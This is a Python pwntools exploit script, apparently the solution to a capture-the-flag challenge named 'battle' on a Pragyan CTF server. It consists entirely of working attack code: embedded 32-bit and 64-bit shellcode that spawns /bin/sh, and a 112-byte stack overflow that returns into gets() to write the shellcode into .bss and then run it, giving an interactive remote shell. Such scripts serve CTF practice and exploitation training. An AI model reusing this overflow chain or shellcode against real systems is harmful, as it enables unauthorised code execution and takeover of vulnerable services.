from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './battle'
HOST = 'ctf.pragyan.org'
PORT = 12500 

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

_32_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

r = start()
if args.D:
    debug(r, [])

for i in range(8):
    r.sendlineafter('/8\n', 'A')

bss = 0x0804c000+0x20
r.sendlineafter('/8\n', 'A dddd')
r.sendlineafter('/8\n', 'F')
payload = 'A'*112
payload += p32(0x8049120) # plt gets
payload += p32(bss)
payload += p32(bss)
r.sendlineafter(' leaderboard:', payload)
r.sendline(_32_SHELLCODE)
r.interactive()
r.close()
